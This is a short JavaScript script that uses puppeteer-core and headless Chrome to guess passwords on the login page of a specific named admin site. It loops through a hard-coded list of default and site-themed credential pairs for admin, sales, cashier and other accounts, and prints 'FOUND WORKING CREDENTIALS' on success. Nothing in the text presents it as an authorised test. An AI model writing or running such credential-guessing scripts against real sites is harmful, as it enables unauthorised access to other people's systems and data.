import puppeteer from 'puppeteer-core';

async function tryLogin(username, password) {
  const browser = await puppeteer.launch({
    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu']
  });

  const page = await browser.newPage();
  await page.goto('https://pentapureadmin.in/public/login', { waitUntil: 'networkidle2' });

  await page.type('#username-input', username);
  await page.type('#password-input', password);

  await Promise.all([
    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {}),
    page.click('button[type="submit"]')
  ]);

  const currentUrl = page.url();
  const text = await page.evaluate(() => document.body.innerText.substring(0, 300));
  const isSuccess = !currentUrl.includes('login') || text.includes('Dashboard') || text.includes('Logout');

  console.log(`[${username} : ${password}] -> URL: ${currentUrl} | Success: ${isSuccess}`);
  if (isSuccess) {
    console.log('>>> FOUND WORKING CREDENTIALS!', username, password, currentUrl);
  }
  await browser.close();
  return isSuccess;
}

async function testList() {
  const list = [
    ['admin', 'password123'],
    ['admin', 'secret123'],
    ['admin', 'admin'],
    ['admin', 'admin123'],
    ['admin', 'pentapure'],
    ['admin', 'pentapure@123'],
    ['sales', 'password123'],
    ['sales', 'secret123'],
    ['sales', 'pass'],
    ['cashier', 'password123'],
    ['cashier', 'secret123'],
    ['cashier', 'pass'],
    ['dispatch', 'password123'],
    ['dispatch', 'secret123'],
    ['attendance', 'password123'],
    ['attendance', 'secret123']
  ];

  for (const [u, p] of list) {
    const ok = await tryLogin(u, p);
    if (ok) break;
  }
}

testList().catch(console.error);
